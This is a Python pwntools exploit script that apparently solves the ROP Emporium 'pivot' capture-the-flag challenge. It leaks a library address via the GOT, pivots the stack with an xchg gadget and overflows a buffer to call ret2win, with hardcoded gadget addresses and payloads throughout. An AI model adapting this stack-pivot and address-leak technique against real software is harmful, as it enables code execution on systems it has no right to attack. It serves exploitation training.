import pwn

def main():
    elf = './pivot'
    p = pwn.process(elf)

    # Constants
    padding = b'A'*32
    rbp_nop = b'\x90'*8 # Not truly a nop, it's just nonsense padding

    # Memory addresses
    start = 0x400760
    puts_plt = 0x4006e0
    # puts_got = 0x601020 # Unused
    foothold_plt = 0x400720
    foothold_got = 0x601040
    # exit_plt = 0x400750 # Used for testing purposes only

    # ROP gadgets
    xchg_rax_rsp = 0x4009bd
    pop_rax = 0x4009bb
    pop_rdi = 0x400a33
    # pop_rbp = 0x4007c8 # Unused
    # add_rax_rbp = 0x4009c4 # Unused

    # Process communication
    print(p.recvuntil(b'The Old Gods kindly bestow upon you a place to pivot: ').decode('latin1'), end='')
    o = p.clean()
    rsp_pivot = int(o[2:14].decode('latin1'), 16)
    print(o[:14].decode('latin1'))
    print(f'Stack pivot: {hex(rsp_pivot)}')
    print(o[15:].decode('latin1'), end='')

    # 1st iteration - 1st input: "Send a ROP chain now and it will land there\n> "
    # p.send(pwn.p64(foothold_plt) + pwn.p64(pop_rdi) + pwn.p64(foothold_got) + pwn.p64(puts_plt) + pwn.p64(pop_rdi) + pwn.p64(42) + pwn.p64(exit_plt)) # exit(42) for testing purposes only
    rop_chain_1_1 = pwn.p64(foothold_plt) + pwn.p64(pop_rdi) + pwn.p64(foothold_got) + pwn.p64(puts_plt) + pwn.p64(start)
    p.send(rop_chain_1_1)
    print(rop_chain_1_1)
    print(p.clean().decode('latin1'), end='')

    # 1st iteration - 2nd input: "Now please send your stack smash\n> "
    rop_chain_1_2 = padding + pwn.p64(rsp_pivot+0x100) + pwn.p64(pop_rax) + pwn.p64(rsp_pivot) + pwn.p64(xchg_rax_rsp)
    print(rop_chain_1_2)
    p.send(rop_chain_1_2)

    o = p.recvuntil(b'Thank you!\nfoothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n')
    print(o.decode('latin1'))
    foothold_addr = pwn.u64(p.clean()[:6] + b'\x00'*2)
    ret2win = foothold_addr + 0x117
    print(f'foothold_function address: {hex(foothold_addr)}')

    # 2nd iteration - 1st input: "Send a ROP chain now and it will land there\n> "
    p.send(rbp_nop) # Unimportant since it's not used this time
    print(rbp_nop)
    print(p.clean().decode('latin1'), end='')

    # 2nd iteration - 2nd input: "Now please send your stack smash\n> "
    rop_chain_2_2 = padding + rbp_nop + pwn.p64(ret2win)
    p.send(rop_chain_2_2)
    print(rop_chain_2_2)
    print(p.clean().decode('latin1'))

if __name__ == '__main__':
    main()
